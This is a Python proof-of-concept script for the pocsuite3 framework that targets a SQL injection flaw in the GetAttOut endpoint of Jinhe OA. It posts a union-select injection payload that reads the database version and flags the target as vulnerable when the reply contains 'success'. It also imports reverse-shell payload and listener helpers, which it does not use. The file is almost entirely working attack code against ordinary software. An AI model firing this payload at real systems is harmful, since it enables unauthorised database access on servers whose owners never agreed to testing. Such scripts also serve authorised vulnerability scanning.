# _*_ coding:utf-8 _*_
# @Time : 2024/1/14
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class jinhe_getattout_sql(POCBase):
    pocDesc = '''金和OA GetAttOut接口 SQL注入'''
    author = '炼金术师诸葛亮'
    createDate = '2024-1-14'
    name = '金和OA GetAttOut接口 SQL注入漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/jc6/JHSoft.WCF/TEST/GetAttOut'
        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        try:
            data = "1' union select null,null,@@version,null,null,null--"


            response = requests.post(url, headers=headers,data=data)
            if response.status_code == 200 and 'success' in response.text:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(jinhe_getattout_sql)